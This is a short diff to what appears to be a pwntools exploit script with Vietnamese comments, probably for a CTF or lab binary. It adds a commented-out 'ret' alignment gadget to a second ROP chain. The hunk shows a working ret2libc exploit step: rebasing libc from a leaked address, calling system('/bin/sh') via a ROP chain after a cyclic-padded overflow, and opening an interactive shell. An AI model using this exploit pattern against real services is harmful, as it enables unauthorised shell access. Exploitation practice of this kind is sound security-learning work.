@@ -229,6 +229,7 @@ libc.address = leak - libc.sym.puts   # rebase toàn bộ libc theo leak
 
 # --- CHAIN 2: giờ mới có địa chỉ system -> ret2libc thật ---
 rop2 = ROP(libc)                      # GIỎ MỚI, lần này tìm gadget trong libc
+#rop2.raw(rop2.find_gadget(["ret"]).address)    # chèn 1 'ret' trước system để căn stack
 rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
 p.sendlineafter(b'> ', flat(cyclic(OFF), rop2.chain()))
 p.interactive()
